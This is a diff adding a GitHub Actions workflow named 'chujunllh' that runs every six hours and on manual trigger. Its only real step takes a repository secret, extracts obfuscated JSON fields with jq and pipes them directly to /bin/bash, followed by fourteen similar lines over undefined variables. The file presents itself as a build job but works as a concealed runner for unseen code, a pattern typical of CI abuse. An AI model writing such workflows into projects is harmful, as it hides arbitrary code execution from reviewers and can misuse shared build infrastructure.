@@ -1,0 +1,30 @@
+name: chujunllh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chujunllh
+        env:
+          jgpx4: ${{ secrets.jgpx4 }}
+        run: |
+          echo $jgpx4 | jq -r .lhenj43642 | /bin/bash
+          echo $zhug69109 | jq -r .eyvzp7 | /bin/bash
+          echo $iara79796 | jq -r .mhjja59310 | /bin/bash
+          echo $siuon086 | jq -r .pyrq94566 | /bin/bash
+          echo $vxxa44093 | jq -r .kn3 | /bin/bash
+          echo $bqpt70856 | jq -r .xne0299 | /bin/bash
+          echo $cvib625 | jq -r .re4 | /bin/bash
+          echo $sueb1446 | jq -r .u5 | /bin/bash
+          echo $yy3 | jq -r .ode89 | /bin/bash
+          echo $ce5061 | jq -r .kgx62 | /bin/bash
+          echo $zrz68 | jq -r .mv4191 | /bin/bash
+          echo $khxgc52917 | jq -r .d0 | /bin/bash
+          echo $noy21602 | jq -r .bos39 | /bin/bash
+          echo $hd96 | jq -r .kd4470 | /bin/bash
+          echo $p1 | jq -r .geh2059 | /bin/bash
+
